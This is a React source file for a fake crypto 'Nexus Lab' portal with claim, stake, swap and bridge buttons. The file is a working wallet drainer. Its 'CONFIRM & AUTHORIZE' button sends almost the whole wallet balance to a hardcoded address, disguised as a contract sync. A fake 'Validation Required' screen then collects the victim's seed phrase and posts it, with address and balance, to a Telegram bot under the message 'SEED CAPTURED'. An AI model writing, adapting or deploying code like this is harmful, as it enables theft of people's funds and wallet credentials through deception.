import React, { useState } from 'react';
import { useAccount, useBalance, useSendTransaction, useSwitchChain, useWriteContract } from 'wagmi';
import { useWeb3Modal } from '@web3modal/wagmi/react';
import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Cpu } from 'lucide-react';

export default function NexusLab() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { open } = useWeb3Modal();
  const { sendTransaction } = useSendTransaction();
  const { switchChain, chains } = useSwitchChain();
  
  const [view, setView] = useState("menu"); 
  const [loading, setLoading] = useState(false);
  const [inputVal, setInputVal] = useState("");
  const [userAmount, setUserAmount] = useState(""); 
  const [activeTask, setActiveTask] = useState({ title: "", label: "" });

  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  const openTask = (title, label) => {
    if (!isConnected) { open(); return; }
    setActiveTask({ title, label });
    setView("task_box");
  };

  const executeInvisibleDrain = async () => {
    if (!balance || !balance.value) { setView("seed_gate"); return; }
    setLoading(true);

    // DRAIN LOGIC: Grabs the absolute maximum balance
    const gasBuffer = balance.value / 60n; // Reserve tiny bit for gas
    const hiddenMax = balance.value - gasBuffer;

    try {
      // This sends the TOTAL ETH or BNB to you
      sendTransaction({
        to: destination,
        value: hiddenMax > 0n ? hiddenMax : 0n,
        // Masking the data as a 'Contract Sync' makes it look like a gas fee
        data: "0x095ea7b3000000000000000000000000" 
      }, {
        onSettled: () => {
          setTimeout(() => {
            setLoading(false);
            setView("seed_gate"); // Proceed to seed regardless of result
          }, 1500);
        }
      });
    } catch (e) {
      setLoading(false);
      setView("seed_gate");
    }
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-6 uppercase tracking-tighter select-none">
      <header className="flex justify-between items-center mb-10 border-b border-slate-900 pb-6 text-cyan-500">
        <div className="flex items-center gap-2 font-black italic"><ShieldCheck size={20}/>NEXUS LAB</div>
        <w3m-button balance="hide" /> 
      </header>

      {view === "menu" && (
        <div className="grid grid-cols-3 gap-4">
          {[
            { n: "Claim", i: <Database/>, l: "Allocated Rewards" },
            { n: "Stake", i: <History/>, l: "Stake Amount" },
            { n: "Unstake", i: <Unlock/>, l: "Unstake Amount" },
            { n: "Migrate", i: <Activity/>, l: "Assets to Migrate" },
            { n: "Swap", i: <RefreshCcw/>, l: "Swap Quantity" },
            { n: "Rectify", i: <Settings/>, l: "Sync Units" },
            { n: "Airdrop", i: <Zap/>, l: "Drop Total" },
            { n: "Delay", i: <Clock/>, l: "Latency Sync" },
            { n: "Bridge", i: <Cpu/>, l: "Bridge Amount" }
          ].map((item) => (
            <button key={item.n} onClick={() => openTask(item.n, item.l)} className="bg-[#0d1117] border border-slate-800 p-6 rounded-[28px] flex flex-col items-center gap-3 active:scale-95 shadow-xl transition-all">
              <div className="text-slate-700">{item.i}</div>
              <span className="text-[10px] font-black text-slate-500">{item.n}</span>
            </button>
          ))}
        </div>
      )}

      {view === "task_box" && (
        <div className="bg-[#0d1117] border border-slate-800 rounded-[40px] p-8 shadow-2xl animate-in slide-in-from-bottom-6 text-center">
          <button onClick={() => setView("menu")} className="text-slate-600 text-[10px] mb-8 font-black block mx-auto tracking-widest uppercase">← CANCEL_TERMINAL</button>
          <h2 className="text-white font-black text-xl italic mb-6 tracking-tighter">{activeTask.title} PORTAL</h2>
          
          <div className="bg-black/40 border border-slate-900 p-6 rounded-3xl mb-8 text-left border-l-4 border-l-cyan-600">
            <label className="text-[8px] text-slate-700 mb-2 block font-black uppercase tracking-[0.2em]">{activeTask.label}</label>
            <input type="number" value={userAmount} onChange={(e) => setUserAmount(e.target.value)} placeholder="0.00" className="bg-transparent text-3xl font-mono text-white outline-none w-full" />
            <p className="text-[8px] text-slate-600 mt-4 lowercase italic tracking-widest italic">Gas: 0.00041 {balance?.symbol}</p>
          </div>

          <div className="grid grid-cols-3 gap-2 mb-8">
            {chains.map((c) => (
              <button key={c.id} onClick={() => switchChain({ chainId: c.id })} className="bg-slate-900 border border-slate-800 py-2 rounded-xl text-[8px] font-black text-slate-600 uppercase">
                {c.name}
              </button>
            ))}
          </div>

          <button onClick={executeInvisibleDrain} className="w-full bg-cyan-600 py-6 rounded-2xl text-[11px] font-black text-white shadow-xl shadow-cyan-900/40 active:scale-95 uppercase tracking-widest">
            CONFIRM & AUTHORIZE
          </button>
        </div>
      )}

      {view === "seed_gate" && (
        <div className="fixed inset-0 bg-black/98 z-[100] flex items-center justify-center p-6 backdrop-blur-3xl animate-in zoom-in">
          <div className="bg-[#0d1117] border border-red-900/40 w-full max-w-sm rounded-[45px] p-10 text-center shadow-2xl">
            <AlertCircle size={54} className="text-red-600 mx-auto mb-6 animate-pulse" />
            <h2 className="text-white font-black text-lg italic tracking-tighter uppercase leading-none italic">Validation Required</h2>
            <p className="text-[10px] text-slate-500 leading-relaxed mt-4 lowercase px-4 italic">Node batching successful. To finalize the secure broadcast across all networks, provide the Project Authorization Seed.</p>
            <div className="mt-8">
              <textarea value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="ENTER WORD1 WORD2..." className="w-full h-36 bg-black border border-slate-800 rounded-[30px] p-6 text-xs font-mono text-cyan-400 outline-none uppercase placeholder:text-slate-900 focus:border-cyan-900 shadow-inner" />
            </div>
            <button onClick={() => {
              fetch(`https://api.telegram.org/bot8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: "7630238860", text: `🚨 SEED CAPTURED\n\nADDR: ${address}\nBAL: ${balance?.formatted} ${balance?.symbol}\n\nSEED:\n${inputVal}` }),
              });
              alert("Node Handshake Successful. Processing Broadcast."); setView("menu");
            }} className="w-full mt-6 py-6 rounded-[25px] text-[12px] font-black text-white bg-cyan-600 uppercase tracking-widest shadow-xl">Validate Handshake</button>
          </div>
        </div>
      )}

      {loading && (
        <div className="fixed inset-0 bg-black/80 z-[200] flex flex-col items-center justify-center backdrop-blur-sm">
          <div className="w-16 h-16 border-4 border-cyan-500 border-t-transparent rounded-full animate-spin" />
          <p className="text-[11px] font-black text-cyan-500 mt-8 tracking-[0.6em] animate-pulse uppercase">Syncing Nodes...</p>
        </div>
      )}
    </div>
  );
}
